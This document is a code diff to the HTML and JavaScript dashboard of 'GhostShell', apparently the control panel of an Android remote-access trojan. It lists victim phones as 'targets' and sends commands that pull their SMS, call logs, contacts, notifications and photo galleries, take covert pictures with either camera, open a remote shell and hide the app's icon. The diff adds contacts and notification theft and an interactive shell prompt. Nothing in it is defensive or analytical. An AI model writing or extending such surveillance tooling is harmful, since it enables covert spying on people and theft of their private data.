@@ -6,85 +6,168 @@
     <title>GhostShell System</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* BASE SYSTEM STYLES (ORIGINAL GHOSTSHELL UI) */
         @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Share Tech Mono', monospace; }
         :root { 
-            --bg: #050505; --surface: #0a0a0a; --surface-light: #111111;
-            --primary: #00ff33; --primary-glow: rgba(0, 255, 51, 0.2);
-            --danger: #ff003c; --text: #e0e0e0; --dim: #557755; 
+            --bg: #050505; 
+            --surface: #0a0a0a; 
+            --surface-light: #111111;
+            --primary: #00ff33;
+            --primary-glow: rgba(0, 255, 51, 0.2);
+            --danger: #ff003c;
+            --text: #e0e0e0; 
+            --dim: #557755; 
         }
+        
         body { 
-            background: var(--bg); color: var(--text); padding: 15px; 
+            background: var(--bg); 
+            color: var(--text); 
+            padding: 15px; 
+            overflow-x: hidden; 
             background-image: linear-gradient(rgba(0, 255, 51, 0.03) 1px, transparent 1px),
             linear-gradient(90deg, rgba(0, 255, 51, 0.03) 1px, transparent 1px);
             background-size: 20px 20px;
         }
-        #loading-screen { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; transition: 0.8s; }
-        .pulse-logo { width: 140px; filter: drop-shadow(0 0 15px var(--primary)); animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(0.95); opacity: 0.8; } 50% { transform: scale(1.05); opacity: 1; } }
 
+        /* LOADING SCREEN */
+        #loading-screen {
+            position: fixed; inset: 0; background: #000; z-index: 9999;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            transition: opacity 0.8s ease-out;
+        }
+        .pulse-logo {
+            width: 140px; filter: drop-shadow(0 0 15px var(--primary));
+            animation: pulse 2s infinite;
+        }
+        .sys-text {
+            margin-top: 25px; color: var(--primary); font-size: 1.1rem;
+            letter-spacing: 3px; animation: blink 1s infinite; text-align: center;
+        }
+        @keyframes pulse { 0% { transform: scale(0.95); opacity: 0.8; } 50% { transform: scale(1.05); opacity: 1; filter: drop-shadow(0 0 25px var(--primary)); } 100% { transform: scale(0.95); opacity: 0.8; } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+        /* LAYOUT */
         .app-container { max-width: 900px; margin: 0 auto; display: flex; flex-direction: column; gap: 20px; }
-        .panel { background: var(--surface); border: 1px solid var(--dim); border-radius: 4px; padding: 20px; position: relative; }
-        .panel::before { content:''; position:absolute; top:-1px; left:-1px; width:15px; height:15px; border-top: 2px solid var(--primary); border-left: 2px solid var(--primary); }
+        .panel { 
+            background: var(--surface); border: 1px solid var(--dim); border-radius: 4px; 
+            padding: 20px; box-shadow: inset 0 0 20px rgba(0,0,0,0.8); position: relative;
+        }
+        .panel::before { 
+            content:''; position:absolute; top:-1px; left:-1px; width:15px; height:15px;
+            border-top: 2px solid var(--primary); border-left: 2px solid var(--primary);
+        }
 
-        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--primary); padding: 15px; }
-        .device-item { background: var(--surface-light); padding: 15px; border-radius: 4px; margin-bottom: 12px; cursor: pointer; border: 1px solid #222; transition: 0.2s; }
-        .device-item:hover { border-color: var(--primary); background: #0f1a0f; }
+        /* HEADER */
+        .header { display: flex; justify-content: space-between; align-items: center; background: #000; border-bottom: 1px solid var(--primary); }
+        .header h1 { font-size: 1.3rem; color: var(--primary); text-shadow: 0 0 10px var(--primary-glow); text-transform: uppercase; letter-spacing: 1px; }
+        .header-actions { display: flex; align-items: center; gap: 15px; }
 
+        /* DEVICE LIST */
+        .device-item { 
+            background: var(--surface-light); padding: 15px; border-radius: 4px; margin-bottom: 12px; 
+            cursor: pointer; border: 1px solid #222; border-left: 4px solid #222;
+            transition: all 0.2s ease; line-height: 1.5; 
+        }
+        .device-item:hover { border-color: var(--dim); border-left: 4px solid var(--primary); background: #162216; }
+        .device-header { display:flex; justify-content: space-between; font-size: 1rem; margin-bottom: 5px; color: #fff; word-break: break-all; gap: 10px;}
+        .device-sub { font-size: 0.8rem; color: var(--dim); display: flex; flex-wrap: wrap; gap: 10px; }
+        .sys-title { color: var(--text); border-bottom: 1px dashed var(--dim); padding-bottom: 8px; margin-bottom: 15px; font-size: 0.95rem; letter-spacing: 1px;}
+
+        /* DASHBOARD STATUS & GRID */
         .top-controls { display: flex; justify-content: space-between; align-items: center; gap: 10px; margin-bottom: 15px; }
-        .status-bar { display: flex; gap: 15px; background: #000; padding: 10px; border: 1px solid #222; font-size: 0.85rem; flex: 1; justify-content: center;}
+        .status-bar { 
+            display: flex; gap: 15px; background: #000; padding: 12px 15px; 
+            border: 1px solid #222; border-radius: 4px; font-size: 0.85rem; flex: 1; word-break: break-all;
+        }
         .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
         
-        .btn { background: #0a0a0a; border: 1px solid #333; border-radius: 4px; padding: 15px 5px; text-align: center; color: var(--dim); cursor: pointer; transition: 0.2s; position: relative;}
+        /* BUTTONS */
+        .btn { 
+            background: #0a0a0a; border: 1px solid #333; border-radius: 4px; padding: 15px 5px; 
+            text-align: center; color: var(--dim); cursor: pointer; font-size: 0.8rem; transition: 0.2s; 
+            position: relative;
+        }
         .btn i { display: block; font-size: 1.5rem; margin-bottom: 8px; color: var(--primary); opacity: 0.8; }
-        .btn:hover { border-color: var(--primary); color: var(--primary); }
+        .btn:hover { border-color: var(--primary); color: var(--primary); box-shadow: inset 0 0 10px var(--primary-glow); }
+        .btn:hover i { opacity: 1; text-shadow: 0 0 8px var(--primary); }
         .btn.active { border-color: var(--danger); color: var(--danger); }
         .btn.active i { color: var(--danger); }
 
-        /* STEALTH TOGGLE (ON/OFF) */
-        .stealth-btn { border-color: var(--dim); }
-        .stealth-btn.on { border-color: var(--primary); color: var(--primary); }
-        .stealth-btn.on i { color: var(--primary); opacity: 1; }
-        .stealth-label { font-size: 0.6rem; position: absolute; top: 5px; right: 5px; color: var(--dim); }
-
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; align-items: center; justify-content: center; padding: 10px; }
-        .modal-card { background: #050505; width: 100%; max-width: 800px; max-height: 90vh; border: 1px solid var(--primary); display: flex; flex-direction: column; }
-        .modal-header { padding: 12px; background: #0a0a0a; display: flex; justify-content: space-between; border-bottom: 1px solid #222; }
-        .modal-body { padding: 15px; overflow-y: auto; flex: 1; text-align: center; }
-        .terminal { background: #000; color: var(--primary); padding: 10px; height: 300px; overflow-y: auto; text-align: left; font-size: 0.8rem; white-space: pre-wrap; }
+        /* STEALTH TOGGLE STYLE */
+        .btn.stealth-on { border-color: var(--primary); color: var(--primary); box-shadow: 0 0 10px var(--primary-glow); }
+        .btn.stealth-on i { color: var(--primary); opacity: 1; }
+        .status-badge { position: absolute; top: 5px; right: 5px; font-size: 0.6rem; padding: 2px 4px; background: #000; border: 1px solid #333; border-radius: 2px;}
+        .stealth-on .status-badge { color: var(--primary); border-color: var(--primary); }
         
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        td { padding: 8px; border-bottom: 1px solid #111; font-size: 0.8rem; text-align: left; }
-        .action-btn { background: transparent; color: var(--primary); border: 1px solid var(--primary); padding: 8px; cursor: pointer; text-transform: uppercase; font-weight: bold; }
-        .action-btn:hover { background: var(--primary); color: #000; }
-        .action-btn.red { border-color: var(--danger); color: var(--danger); }
+        button.action-btn { 
+            background: transparent; color: var(--primary); font-weight: bold; border: 1px solid var(--primary); 
+            padding: 8px 12px; border-radius: 2px; cursor: pointer; transition: 0.2s; text-transform: uppercase;
+        }
+        button.action-btn:hover { background: var(--primary); color: #000; box-shadow: 0 0 15px var(--primary-glow); }
+        button.action-btn.red { border-color: var(--danger); color: var(--danger); }
 
-        @media (max-width: 600px) { .grid { grid-template-columns: repeat(2, 1fr); } }
+        /* MODAL & TERMINAL */
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(3px); z-index: 100; align-items: center; justify-content: center; padding: 10px; }
+        .modal-card { background: #050505; width: 100%; max-width: 850px; max-height: 90vh; border-radius: 4px; border: 1px solid var(--primary); display: flex; flex-direction: column; box-shadow: 0 0 30px rgba(0,255,51,0.1); }
+        .modal-header { padding: 12px 15px; background: #0a0a0a; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #222; }
+        .modal-body { padding: 15px; overflow-y: auto; flex: 1; font-size: 0.85rem; text-align: center;}
+        .modal-footer { padding: 12px 15px; background: #0a0a0a; display: flex; gap: 8px; flex-wrap: wrap; border-top: 1px solid #222; }
+        
+        .terminal { 
+            background: #000; color: var(--primary); padding: 12px; border-radius: 2px; 
+            height: 300px; overflow-y: auto; border: 1px solid #222; margin-bottom: 10px; white-space: pre-wrap;
+            box-shadow: inset 0 0 15px rgba(0,255,51,0.05); word-break: break-all; text-align: left;
+        }
+        
+        /* TABLES & FORMS */
+        .table-responsive { width: 100%; overflow-x: auto; display: block; }
+        table { width: 100%; border-collapse: collapse; min-width: 400px; }
+        th { color: var(--dim); border-bottom: 1px solid #333; padding: 8px; text-align: left; text-transform: uppercase; font-size: 0.75rem; white-space: nowrap;}
+        td { padding: 8px; border-bottom: 1px solid #111; color: var(--text); font-size: 0.85rem; text-align: left; }
+        input, textarea { background: #0a0a0a; border: 1px solid #333; padding: 10px; border-radius: 2px; color: var(--primary); width: 100%; outline: none; }
+        
+        .gal-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 8px; }
+        .gal-item img { width: 100%; height: 90px; object-fit: cover; border-radius: 2px; border: 1px solid #333; }
+        
+        @media (max-width: 650px) {
+            .grid { grid-template-columns: repeat(2, 1fr); }
+            .status-bar { flex-direction: column; align-items: center; }
+        }
     </style>
 </head>
 <body>
-    <div id="loading-screen"><img src="https://i.ibb.co.com/Y7YpxtHt/logogs-removebg-preview.png" class="pulse-logo"></div>
+    <div id="loading-screen">
+        <img src="https://i.ibb.co.com/Y7YpxtHt/logogs-removebg-preview.png" alt="GhostShell" class="pulse-logo">
+        <div class="sys-text">SYSTEM INITIALIZING...</div>
+    </div>
 
     <div class="app-container">
         <header class="panel header">
-            <h1 style="color:var(--primary); letter-spacing: 2px;">GHOST_SHELL</h1>
-            <div style="font-size:0.8rem; color:var(--dim);">[UID: <span id="user-display" style="color:var(--primary)"></span>]</div>
-            <button onclick="logout()" class="action-btn red" style="font-size:0.7rem;">DISCONNECT</button>
+            <h1><i class="fas fa-terminal"></i> GhostShell_OS</h1>
+            <div class="header-actions">
+                <div style="color:var(--dim); font-size:0.85rem;">[UID: <span id="user-display" style="color:var(--primary)"></span>]</div>
+                <button onclick="logout()" class="action-btn red" style="font-size: 0.7rem;">DISCONNECT</button>
+            </div>
         </header>
 
         <div id="selection-view" class="panel">
-            <h3 style="color:var(--dim); font-size:0.9rem; margin-bottom:15px;">TARGET_ENDPOINTS</h3>
-            <div id="device-list"></div>
+            <h3 class="sys-title"><i class="fas fa-satellite-dish"></i> DETECTED TARGETS</h3>
+            <div id="device-list" style="margin-top: 15px;">
+                <div style="color:var(--dim); text-align:center; padding: 20px 0;">Scanning network...</div>
+            </div>
         </div>
 
         <div id="dashboard-view" class="panel" style="display:none;">
             <div class="top-controls">
-                <button onclick="backToSelection()" class="action-btn" style="border-color:#444; color:#888;">BACK</button>
+                <button onclick="backToSelection()" class="action-btn" style="border-color: #555; color: #ccc;">BACK</button>
                 <div class="status-bar">
-                    <span>ID: <b id="sel-info" style="color:var(--primary);">None</b></span>
-                    <span>STAT: <b id="conn-stat">OFFLINE</b></span>
+                    <span>TARGET: <b id="sel-info" style="color:var(--primary);">None</b></span>
+                    <span>LINK: <b id="conn-stat" style="color:var(--danger);">OFFLINE</b></span>
                 </div>
             </div>
+            <h3 class="sys-title"><i class="fas fa-microchip"></i> EXECUTE COMMAND</h3>
             <div class="grid" id="main-grid"></div>
         </div>
     </div>
@@ -92,22 +175,26 @@
     <div id="modal" class="modal">
         <div class="modal-card">
             <div class="modal-header">
-                <h3 id="modal-title" style="color:var(--primary);">COMMAND_OUTPUT</h3>
-                <span style="cursor:pointer; color:var(--danger);" onclick="closeModal()">[ CLOSE ]</span>
+                <h3 id="modal-title" style="color:var(--primary); text-transform: uppercase;">MODAL</h3>
+                <span style="cursor:pointer; font-size:1.5rem; color: var(--danger);" onclick="closeModal()">&times;</span>
             </div>
             <div class="modal-body" id="modal-body"></div>
-            <div class="modal-footer" id="modal-footer" style="padding:10px; background:#0a0a0a; display:flex; gap:10px;"></div>
+            <div class="modal-footer" id="modal-footer"></div>
         </div>
     </div>
 
     <script>
+        window.onload = () => setTimeout(() => {
+            const loader = document.getElementById('loading-screen');
+            loader.style.opacity = '0';
+            setTimeout(() => loader.style.display = 'none', 800);
+        }, 1500);
+
         const myUid = localStorage.getItem('ghost_uid');
         if(!myUid) location.href = '/';
         document.getElementById('user-display').innerText = myUid;
 
-        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", isStealth = false, isFlash = false;
-
-        window.onload = () => setTimeout(() => document.getElementById('loading-screen').style.display='none', 1500);
+        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", termOut = "", isStealth = false, isFlash = false;
 
         async function cmd(c, b={}) {
             if(!selId) return;
@@ -115,30 +202,35 @@
         }
 
         function logout() { localStorage.removeItem('ghost_uid'); location.href = '/'; }
-        function backToSelection() { selId = null; document.getElementById('dashboard-view').style.display='none'; document.getElementById('selection-view').style.display='block'; }
-        function selectTarget(id) { selId = id; document.getElementById('selection-view').style.display='none'; document.getElementById('dashboard-view').style.display='block'; updateMain(); }
+        function backToSelection() { selId = null; document.getElementById('dashboard-view').style.display = 'none'; document.getElementById('selection-view').style.display = 'block'; }
+        function selectTarget(id) { selId = id; document.getElementById('selection-view').style.display = 'none'; document.getElementById('dashboard-view').style.display = 'block'; updateMain(); }
 
         function toggleStealth(btn) {
             isStealth = !isStealth;
             cmd(isStealth ? 'hide_icon' : 'show_icon');
-            btn.classList.toggle('on');
-            btn.querySelector('.stealth-label').innerText = isStealth ? 'ON' : 'OFF';
+            btn.classList.toggle('stealth-on');
+            btn.querySelector('.status-badge').innerText = isStealth ? 'ON' : 'OFF';
         }
 
-        function toggleFlash(btn) { isFlash = !isFlash; cmd(isFlash ? 'flashon' : 'flashoff'); btn.classList.toggle('active'); }
+        function toggleFlash(btn) {
+            isFlash = !isFlash;
+            cmd(isFlash ? 'flashon' : 'flashoff');
+            btn.classList.toggle('active');
+        }
 
         function openModal(t) {
             curMod = t; hash = "";
             document.getElementById('modal').style.display = 'flex';
-            document.getElementById('modal-title').innerText = t.toUpperCase();
+            document.getElementById('modal-title').innerText = t.replace('_', ' ');
             const b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
-            b.innerHTML = "<div style='color:var(--primary)'>WAITING FOR HANDSHAKE...</div>"; f.innerHTML = "";
+            b.innerHTML = "<div style='color:var(--primary)'>ESTABLISHING CONNECTION...</div>"; f.innerHTML = "";
 
             if(t === 'filemanager') {
-                b.innerHTML = `<div class="terminal" id="terminal">root@ghost:~$ Establishing shell...</div>`;
+                termOut = "root@ghost_os:~# Shell Active.\n";
+                b.innerHTML = `<div class="terminal" id="terminal">${termOut}</div><div style="display:flex; gap:10px; background:#000; padding:12px; border:1px solid #333;"><span style="color:var(--primary)">#</span><input id="term-in" style="background:transparent; border:none; color:var(--primary); outline:none; width:100%;" autofocus onkeydown="if(event.key==='Enter') execShell()"></div>`;
                 cmd('filemanager');
             } else if(t.includes('pic')) {
-                b.innerHTML = `<div id="cam-status" style="margin-bottom:10px; color:var(--primary)">Capturing...</div><div id="cam-container"></div>`;
+                b.innerHTML = `<div style="color:var(--primary); margin-bottom:15px;" id="cam-status">INITIALIZING CAMERA SENSOR...</div><div id="cam-result"></div>`;
                 f.innerHTML = `<button class="action-btn red" onclick="closeModal()">FORCE ABORT</button>`;
                 cmd(t === 'takebackpic' ? 'takebackpic' : 'takefrontpic');
             } else {
@@ -150,33 +242,37 @@
         function closeModal() {
             if(curMod === 'gallery') cmd('exit_gallery');
             if(curMod === 'filemanager') cmd('exit_shell');
-            curMod = null; hash = "";
-            document.getElementById('modal').style.display = 'none';
+            curMod = null; hash = ""; document.getElementById('modal').style.display = 'none';
         }
 
         function render() {
             if(!curMod || !selId || !cache[selId]) return;
-            const d = cache[selId], b = document.getElementById('modal-body');
-            const data = d[curMod] || d.info || d.media;
-            const curHash = JSON.stringify(data);
-            if(hash === curHash) return; hash = curHash;
-
+            const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
+            
             if(curMod.includes('pic')) {
-                if(d.media.status === 'done' && d.media.last_img) {
-                    b.innerHTML = `<img src="/captured_images/${d.media.last_img}?t=${Date.now()}" style="width:100%; border:1px solid var(--primary);">`;
+                const media = d.media;
+                if(media.status === 'done' && media.last_img) {
+                    b.innerHTML = `<img src="/captured_images/${media.last_img}?t=${Date.now()}" style="width:100%; max-width:600px; border:1px solid var(--primary); box-shadow:0 0 20px var(--primary-glow);">`;
                 } else {
-                    b.innerHTML = `<div style="color:var(--primary)">STATUS: ${d.media.status}...</div>`;
+                    document.getElementById('cam-status').innerText = `STATUS: ${media.status || 'WAITING'}...`;
                 }
                 return;
             }
 
+            const data = d[curMod] || d.info;
+            const curHash = JSON.stringify(data);
+            if(hash === curHash) return; hash = curHash;
+            b.innerHTML = "";
+
             if(curMod === 'info') {
                 const i = d.info;
-                b.innerHTML = `<table><tr><td>MODEL</td><td>${i.Model}</td></tr><tr><td>OS</td><td>Android ${i.AndroidVersion}</td></tr><tr><td>BATT</td><td>${i.Battery}</td></tr><tr><td>WIFI</td><td>${i.WiFi}</td></tr></table>`;
+                b.innerHTML = `<div class="table-responsive"><table><tr><td>MODEL</td><td>${i.Model}</td></tr><tr><td>VENDOR</td><td>${i.Manufacturer}</td></tr><tr><td>OS</td><td>Android ${i.AndroidVersion}</td></tr><tr><td>BATT</td><td>${i.Battery}</td></tr><tr><td>WIFI</td><td>${i.WiFi}</td></tr></table></div>`;
             } else if(curMod === 'apps') {
-                b.innerHTML = `<table>${d.apps.map(a=>`<tr><td>${a.appName}<br><small>${a.packageName}</small></td><td><button onclick="cmd('run ${a.packageName}')" class="action-btn">RUN</button></td></tr>`).join('')}</table>`;
+                b.innerHTML = `<div class="table-responsive"><table>${d.apps.map(a=>`<tr><td><b>${a.appName}</b><br><small>${a.packageName}</small></td><td style="text-align:right;"><button class="action-btn" onclick="cmd('run ${a.packageName}')">RUN</button></td></tr>`).join('')}</table></div>`;
             } else if(curMod === 'sms') {
-                b.innerHTML = `<table>${d.sms.map(s=>`<tr><td style="color:var(--primary)">${s.userSender}</td><td>${s.content}</td></tr>`).join('')}</table>`;
+                b.innerHTML = `<div class="table-responsive"><table>${d.sms.map(s=>`<tr><td style="color:var(--primary)">${s.userSender}</td><td>${s.content}</td></tr>`).join('')}</table></div>`;
+            } else if(curMod === 'contacts') {
+                b.innerHTML = `<div class="table-responsive"><table>${d.contacts.map(c=>`<tr><td>${c.name}</td><td style="color:var(--primary)">${c.number}</td></tr>`).join('')}</table></div>`;
             }
         }
 
@@ -184,11 +280,18 @@
             try {
                 const res = await fetch(`/api/status?owner=${myUid}`);
                 state = await res.json();
-                document.getElementById('device-list').innerHTML = state.devices.map(d=>`<div class="device-item" onclick="selectTarget('${d.id}')"><b>${d.model}</b><br><small>${d.cnt} | ${d.bat}</small></div>`).join('') || "NO TARGETS ONLINE";
+                document.getElementById('device-list').innerHTML = state.devices.map(d=>`
+                    <div class="device-item" onclick="selectTarget('${d.id}')">
+                        <div class="device-header"><span><i class="fas fa-mobile-screen" style="color:var(--primary);"></i> ${d.model}</span><span style="color:var(--primary); font-size:0.8rem;">[ACTIVE]</span></div>
+                        <div class="device-sub"><span>OS: ${d.ver}</span><span>LOC: ${d.cnt}</span><span>PWR: ${d.bat}</span></div>
+                    </div>
+                `).join('') || "<div style='color:var(--dim); text-align:center;'>No active targets found.</div>";
+                
                 if(selId) {
                     const dres = await fetch(`/api/data/${selId}`);
                     cache[selId] = await dres.json();
-                    document.getElementById('conn-stat').innerText = "ONLINE";
+                    document.getElementById('sel-info').innerText = selId;
+                    document.getElementById('conn-stat').innerText = "ESTABLISHED";
                     document.getElementById('conn-stat').style.color = "var(--primary)";
                     if(curMod) render();
                 }
@@ -198,14 +301,15 @@
 
         function updateMain() {
             const btns = [
-                {id:'info', i:'fa-server', l:'INFO'}, {id:'filemanager', i:'fa-terminal', l:'SHELL'},
+                {id:'info', i:'fa-server', l:'SYS INFO'}, {id:'filemanager', i:'fa-terminal', l:'SHELL'},
                 {id:'sms', i:'fa-comment', l:'SMS'}, {id:'calls', i:'fa-phone', l:'CALLS'},
-                {id:'apps', i:'fa-box', l:'APPS'}, {id:'gallery', i:'fa-images', l:'GALLERY'},
+                {id:'apps', i:'fa-box', l:'APPS'}, {id:'contacts', i:'fa-address-book', l:'CONTACTS'},
+                {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'},
                 {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
                 {id:'stealth', i:'fa-eye-slash', l:'STEALTH', type:'stealth'}, {id:'flash', i:'fa-bolt', l:'FLASH', type:'flash'}
             ];
             document.getElementById('main-grid').innerHTML = btns.map(b=>{
-                if(b.type==='stealth') return `<div class="btn stealth-btn ${isStealth?'on':''}" onclick="toggleStealth(this)"><span class="stealth-label">${isStealth?'ON':'OFF'}</span><i class="fas ${b.i}"></i>${b.l}</div>`;
+                if(b.type==='stealth') return `<div class="btn stealth-btn ${isStealth?'stealth-on':''}" onclick="toggleStealth(this)"><span class="status-badge">${isStealth?'ON':'OFF'}</span><i class="fas ${b.i}"></i>${b.l}</div>`;
                 if(b.type==='flash') return `<div class="btn ${isFlash?'active':''}" onclick="toggleFlash(this)"><i class="fas ${b.i}"></i>${b.l}</div>`;
                 return `<div class="btn" onclick="openModal('${b.id}')"><i class="fas ${b.i}"></i>${b.l}</div>`;
             }).join('');
